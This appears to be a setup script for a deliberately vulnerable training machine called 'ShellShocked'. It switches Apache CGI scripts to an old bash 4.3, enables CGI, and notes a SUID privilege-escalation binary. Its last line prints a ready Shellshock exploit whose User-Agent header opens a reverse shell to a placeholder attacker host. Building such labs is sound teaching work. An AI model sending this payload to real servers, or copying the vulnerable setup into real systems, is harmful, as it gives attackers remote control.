#!/bin/bash
# Machine 05: ShellShocked — Setup
# 1. Update CGI shebang to vulnerable bash 4.3
# 2. Activate CGI config in Apache (a2enconf)
# 3. SUID privesc via /usr/local/bin/vuln-reader (custom binary)

# Update CGI shebang to vulnerable bash 4.3
for f in /usr/lib/cgi-bin/*.cgi; do
    sed -i "1s|.*|#!/opt/bash43/bin/bash|" "$f" 2>/dev/null
done
chmod +x /usr/lib/cgi-bin/*.cgi 2>/dev/null

# Write and ACTIVATE the Apache CGI ScriptAlias config
cat > /etc/apache2/conf-available/serve-cgi-bin.conf << 'CONF'
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
<Directory "/usr/lib/cgi-bin">
    AllowOverride None
    Options +ExecCGI -MultiViews
    Require all granted
</Directory>
CONF

# CRITICAL: Enable the config (this was missing before)
a2enconf serve-cgi-bin 2>/dev/null || true

# Ensure CGI modules are active
a2enmod cgi 2>/dev/null || a2enmod cgid 2>/dev/null || true

echo "[*] ShellShocked setup complete"
echo "[*] Privesc: SUID binary at /usr/local/bin/vuln-reader"
echo "[*] Exploit: curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' http://target/cgi-bin/test.cgi"
